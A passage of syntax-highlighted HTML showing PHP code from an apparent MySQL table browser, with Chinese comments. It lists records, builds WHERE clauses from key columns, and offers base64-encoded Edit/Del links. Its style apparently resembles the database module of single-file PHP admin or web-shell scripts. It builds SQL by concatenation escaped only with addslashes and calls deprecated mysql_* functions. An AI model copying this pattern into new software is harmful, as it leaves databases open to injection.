#3e999f; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">mn</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_assoc(</span>$<span style="color: #eab700;">result</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="</span><span style="color: #3e999f; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = $<span style="color: #eab700;">tmp</span> = $<span style="color: #eab700;">b1</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">mn</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span>=&gt;$<span style="color: #eab700;">inside</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">inside</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">rowdb</span>[$<span style="color: #eab700;">key</span>][<span style="color: #3e999f;">'Key'</span>] == <span style="color: #3e999f;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = $<span style="color: #eab700;">key</span>.<span style="color: #3e999f;">"='"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">addslashe</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">s(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">break</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> .= $<span style="color: #eab700;">tmp</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">key</span>.<span style="color: #3e999f;">"='"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">addslas</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">hes(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tmp</span> = <span style="color: #3e999f;">' AND '</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">mn</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span>=&gt;$<span style="color: #eab700;">inside</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">b1</span> .= <span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>.<span style="color: #4d4d4c; background-color: #ffffff;">html_clean(</span>$<span style="color: #eab700;">ins</span><span style="color: #eab700; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = <span style="color: #4d4d4c; background-color: #ffffff;">base64_encode(</span>$<span style="color: #eab700;">where</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">allowedit</span>) <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #3e999f; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">b1</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">unset(</span>$<span style="color: #eab700;">b1</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">allowedit</span>) <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fieldnum</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_num_fields(</span>$<span style="color: #eab700;">result</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;$<span style="color: #eab700;">i</span>&lt;$<span style="color: #eab700;">fieldnum</span>;$<span style="color: #eab700;">i</span>++){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">name</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_name(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">type</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_type(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">len</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_len(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #3e999f; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">tbfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">multipage</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">break</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">case</span> <span style="color: #4271ae;">2</span>:
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">ar</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_affected_rows(</span>);
